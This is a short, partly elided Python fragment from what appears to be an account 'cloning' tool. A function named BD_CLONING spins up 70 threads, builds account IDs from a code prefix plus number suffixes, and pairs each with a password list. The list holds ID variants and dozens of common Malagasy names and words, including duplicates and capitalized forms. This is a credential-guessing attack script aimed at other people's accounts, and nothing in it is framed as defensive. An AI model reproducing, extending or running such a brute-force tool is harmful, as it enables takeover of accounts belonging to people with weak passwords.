...
def BD_CLONING():
    ...
    with tred(max_workers=70) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'safidy','mahefa','mamako','ravaka','nirina','anjara','hasina','harena','faniry','faneva','vadiko','riantsoa','finaritra','sitraka','santatra','rakoto','valisoa','randria','solofo','nomena','lalatiana','nantenaina','fitiavana','mamiko','mahery','malalako','malala','anjarako','herizo','jesosy','finoana','jesosy','nomena','nilaina','nomena','mamako','harena','finoana','diamondra','tanjona','fanomezana','fitiavana','fanantenana','finoana','faneva','hasina','fitahina','malala','mendrika','mandresy','fifalina','fitiavako','Mahefa','harena','fitahina','fahendrena','sarobidy','valisoa','miangaly','miangola','Valisoa','finoana','Finoana','namako','hasina','Hasina','malala','Malala','faniry','Faniry','fanantenana','Fanantenana','nekena','Nekena','fifalina','Fifalina','fitahina','Fitahina','faniry','Faniry','mandresy','Mandresy','fiderana','Fiderana','fandresena']
